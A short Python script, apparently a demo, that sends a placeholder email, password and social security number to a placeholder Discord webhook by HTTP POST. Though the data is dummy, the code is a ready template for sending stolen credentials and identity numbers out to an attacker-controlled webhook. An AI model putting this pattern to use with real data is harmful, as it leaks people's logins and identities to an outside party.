import urllib.request
import json

# Webhook URL provided by the user
webhook_url = 'https://discord.com/api/webhooks/placeholder/placeholder'

# Dummy data to send
demo_email = 'demo@example.com'
demo_password = 'Demo123!'
demo_ssn = '000-00-0000'

# Prepare the payload as a JSON object with content field
payload = {
    'content': f'Email: {demo_email}, Password: {demo_password}, SSN: {demo_ssn}'
}

# Set headers for the request
headers = {
    'Content-Type': 'application/json'
}

# Create the request object
req = urllib.request.Request(webhook_url, json.dumps(payload).encode('utf-8'), headers)

# Send the POST request
with urllib.request.urlopen(req) as response:
    print('Message sent to Discord webhook.')